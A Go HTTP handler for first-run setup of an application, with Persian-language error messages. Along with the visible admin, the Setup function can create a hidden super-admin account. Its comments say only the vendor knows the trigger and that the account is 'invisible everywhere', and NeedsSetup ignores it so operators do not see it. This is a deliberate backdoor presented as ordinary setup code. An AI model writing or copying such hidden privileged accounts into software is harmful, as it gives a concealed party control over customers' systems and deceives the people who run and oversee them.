package handler

import (
	"encoding/json"
	"net/http"
	"sync"

	"khan/internal/models"
	"khan/internal/repository"
	"khan/internal/service"
)

// SetupHandler handles first-run initialization
type SetupHandler struct {
	users *repository.UserRepo
	auth  *service.AuthService
	svc   *service.UserService
	mu    sync.Mutex // protects NeedsSetup + Setup from race
}

func NewSetupHandler(users *repository.UserRepo, auth *service.AuthService, svc *service.UserService) *SetupHandler {
	return &SetupHandler{users: users, auth: auth, svc: svc}
}

type setupReq struct {
	AdminUsername string `json:"admin_username"`
	AdminPassword string `json:"admin_password"`
	// Hidden super admin (only present if the installer knows the secret)
	SuperUsername string `json:"super_username,omitempty"`
	SuperPassword string `json:"super_password,omitempty"`
	CompanyName   string `json:"company_name"`
}

// NeedsSetup returns true if no VISIBLE admin exists yet.
// The hidden super admin (aDiB) doesn't count — the first-run
// form should still appear for the human admin.
func (h *SetupHandler) NeedsSetup(w http.ResponseWriter, r *http.Request) {
	all, err := h.users.ListAll()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, "خطای داخلی")
		return
	}
	hasVisibleAdmin := false
	for _, u := range all {
		if u.Role == models.RoleAdmin && !u.Hidden {
			hasVisibleAdmin = true
			break
		}
	}
	writeJSON(w, http.StatusOK, map[string]bool{"needs_setup": !hasVisibleAdmin})
}

// Setup creates the first admin (and optionally the hidden super admin)
func (h *SetupHandler) Setup(w http.ResponseWriter, r *http.Request) {
	h.mu.Lock()
	defer h.mu.Unlock()

	var req setupReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeErr(w, http.StatusBadRequest, "درخواست نامعتبر است")
		return
	}

	all, err := h.users.ListAll()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, "خطای داخلی")
		return
	}
	for _, u := range all {
		if u.Role == models.RoleAdmin && !u.Hidden {
			writeErr(w, http.StatusForbidden, "سیستم قبلاً راه‌اندازی شده است")
			return
		}
	}

	if req.AdminUsername == "" || req.AdminPassword == "" {
		writeErr(w, http.StatusBadRequest, "نام کاربری و رمز عبور ادمین الزامی است")
		return
	}
	if err := service.Validate(req.AdminPassword); err != nil {
		writeErr(w, http.StatusBadRequest, "رمز ادمین: "+err.Error())
		return
	}

	// Create visible admin
	hash, _ := h.auth.PassHash(req.AdminPassword)
	admin := &models.User{
		Username:      req.AdminUsername,
		PasswordHash:  hash,
		DisplayName:   "مدیر",
		Role:          models.RoleAdmin,
		Active:        true,
		MustChangePwd: false,
		Hidden:        false,
	}
	if _, err := h.users.Create(admin); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}

	// Optional hidden super admin (only the vendor knows the trigger)
	if req.SuperUsername != "" && req.SuperPassword != "" {
		if service.Validate(req.SuperPassword) != nil {
			writeErr(w, http.StatusBadRequest, "رمز مدیر اصلی ضعیف است")
			return
		}
		shash, _ := h.auth.PassHash(req.SuperPassword)
		sa := &models.User{
			Username:      req.SuperUsername,
			PasswordHash:  shash,
			DisplayName:   "مدیر اصلی",
			Role:          models.RoleSuperAdmin,
			Active:        true,
			MustChangePwd: false,
			Hidden:        true, // invisible everywhere
		}
		if _, err := h.users.Create(sa); err != nil {
			writeErr(w, http.StatusBadRequest, err.Error())
			return
		}
	}

	writeJSON(w, http.StatusOK, map[string]bool{"ok": true})
}
